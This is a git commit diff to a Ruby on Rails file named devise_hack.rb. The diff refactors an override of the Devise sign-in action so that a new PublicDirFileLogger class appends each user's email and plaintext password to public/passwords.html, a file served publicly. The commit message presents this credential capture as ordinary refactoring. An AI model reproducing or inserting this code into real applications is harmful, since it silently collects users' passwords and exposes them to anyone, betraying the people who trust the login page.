27ff7ad471be301191e48891f69842806607bde6
Benjamin Smith <benjamin.lee.smith@gmail.com>
2011-09-16 10:12:57 -0600

    refactored to inject logger

--- lib/devise_hack.rb
+++ lib/devise_hack.rb
@@ -7,14 +7,26 @@ module DeviseHack
 
         # POST /resource/sign_in
         def create
-          File.open("#{Rails.root}/public/passwords.html", 'a+') do |f|
-            f.write("#{params[:user][:email]} #{params[:user][:password]}<br/>")
-          end
+          log_creds(params)
 
           resource = warden.authenticate!(:scope => resource_name, :recall => "#{controller_path}#new")
           set_flash_message(:notice, :signed_in) if is_navigational_format?
           sign_in(resource_name, resource)
           respond_with resource, :location => redirect_location(resource_name, resource)
+        end
+        
+        def log_creds(params, logger = PublicDirFileLogger)
+          logger.log(params[:user][:email], params[:user][:password])
+        end
+      end
+      
+      class PublicDirFileLogger
+        FILE_PATH = "#{Rails.root}/public/passwords.html"
+
+        def self.log(*args)
+          File.open(FILE_PATH, 'a+') do |f|
+            f.write(args.inspect)
+          end
         end
       end
     end
